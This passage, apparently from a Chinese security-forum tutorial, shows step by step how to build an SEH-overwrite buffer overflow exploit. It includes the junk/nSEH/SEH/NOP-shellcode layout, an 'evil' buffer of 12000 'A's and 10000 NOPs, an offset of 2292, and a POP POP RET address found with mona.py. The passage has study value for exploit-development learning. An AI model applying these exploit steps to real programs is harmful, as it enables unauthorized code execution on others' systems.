程序出现异常，seh链，已经被覆盖为 `AAAA`。

![](https://bbs.kanxue.com/upload/attach/201703/644154_q4lunzu8hs7v986.png)

接下来构造seh的payload:

`[junk][nSEH][SEF][nop+shellcode]`

接下来要搞定触发异常的大小，SEH位置，`POP POP RET`

```
evil += "&password=aaaaa\r\n"

evil += "A" * 12000

evil += "\x90" * 10000
```

![](https://bbs.kanxue.com/upload/attach/201703/644154_c6fzsc7jo73nzf4.png)

![](https://bbs.kanxue.com/upload/attach/201703/644154_at7t28cbs1o01b1.png)

触发异常，算一下seh的地址，相差 2292

用 `mona.py` `[!mona seh]` 插件找一下 `POP POP RET`

![](https://bbs.kanxue.com/upload/attach/201703/644154_m269bn081ecm80w.png)

更改payload为

```
seh = "\xac\x43\x0c\x10"
```
